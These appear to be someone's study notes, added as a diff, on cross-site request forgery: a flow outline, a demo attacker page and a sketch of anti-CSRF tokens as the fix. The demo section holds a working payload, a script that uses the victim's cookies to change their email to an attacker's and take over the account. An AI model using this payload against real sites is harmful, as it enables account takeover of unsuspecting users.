@@ -1,0 +1,62 @@
+Overview:
+    -- CSRF Attack: Changing a User’s Email
+    -- Demo
+    -- CSRF Attack: Account Takeover
+    -- Fixing the Problem
+
+
+
+::  CSRF Attack: Changing a User’s Email  ::
+--  Tool(s)  --
+
+
+User is logged in at (example.com)
+
+User visits an attacker's domain at (hacking-web-app.com)
+
+Attacker tricks the users browser into sending a request
+    that changes the user's email (example.com)
+
+Auth cookie is appended to the request
+
+Request is processed by the domain changing the users email...
+
+
+
+
+::  Demo  ::  && ::  CSRF Attack: Account Takeover  ::
+--  Tool(s)  --
+
+// Visit bad domain with malicious script
+// *** Good domain hasn't CSRF protection...
+<html>
+    <body> Hello, how are you?
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://example.com/profile.php", true);
+            xhr.setRequestHeader( "Content-Type", "application/x-www-form-urlencoded") ;
+            xhr.withCredentials = true;   # Add user's cookies to the request...
+            var body = “email=attacker@example.com&action=Change+email"; # Set form request parameters
+            xhr.send(body);
+        </script>
+    </body>
+</html>
+
+The above runs on bad domain making request to good domain.
+The request appends cookies and sends new email and action item to change user's info.
+*** There seems to be no checks against the request domain...
+*** Even then, if attack domain similar the browser could fool the good domain much like the cookie cross domain attack, right?
+
+
+
+
+::  Fixing the Problem  ::
+--  Tool(s)  --
+
+
+Add anti-csrf token to request... how?
+
+My Idea: Store token somewhere on page of domain.
+         When making request, get the "hidden field" with the token and add to request.
+         When logging in or out, invalidate the tokens and get new ones.
+         *** Make looooooooonnnggg and unpredictable to combat brute force techniques.
